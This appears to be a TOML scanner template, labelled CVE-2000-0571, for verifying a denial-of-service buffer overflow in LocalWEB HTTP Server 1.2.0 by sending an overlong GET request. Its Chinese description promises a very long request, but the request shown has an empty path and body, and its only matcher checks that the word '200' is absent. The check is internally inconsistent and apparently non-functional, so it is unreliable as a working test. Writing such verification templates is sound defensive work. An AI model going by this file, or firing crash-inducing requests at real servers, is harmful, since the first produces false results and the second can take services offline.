[info]
author = "ave"
description = "LocalWEB HTTP Server 1.2.0 存在缓冲区溢出漏洞，远程攻击者无需认证，向目标服务器发送超长 GET 请求即可触发缓冲区溢出导致服务崩溃（拒绝服务）。本 PoC 通过发送一个长度远超正常请求的长 GET 请求，观察目标是否在响应前断开连接或停止响应，从而验证漏洞存在。"
id = "POC-AVE-2000-0455"
name = "CVE-2000-0571 LocalWEB HTTP Server 长 GET 请求缓冲区溢出 PoC"
severity = "medium"
tags = ["ave-2000-0455"]
vuln_id = [
    "CVE-2000-0571",
    "AVE-2000-0455",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = ""
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["200"]
